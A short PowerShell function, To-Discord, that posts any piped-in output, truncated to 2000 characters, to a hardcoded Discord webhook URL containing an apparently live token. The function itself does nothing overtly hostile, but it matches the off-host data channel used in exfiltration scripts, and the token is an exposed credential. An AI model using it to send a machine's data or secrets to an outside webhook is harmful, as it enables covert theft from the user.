function To-Discord {
    param (
        [string]$webhookUrl = 'https://discord.com/api/webhooks/1288689545218359317/qh08qb41zW9QJ_tiX4kZl4E7w-FfpbY0r8WzpLqH_oHXuCtdfnTBXKtLY-Tw5fYDRyGi'
    )
    
    $output = $input | Out-String
    $content = $output.Substring(0, [math]::Min($output.Length, 2000))
    
    if (-not [string]::IsNullOrEmpty($content.Trim())) {
        irm $webhookUrl -Method Post -ContentType 'application/json' -Body (@{content=$content} | ConvertTo-Json)
    } else {
        write "Output is empty or not valid for sending."
    }
}
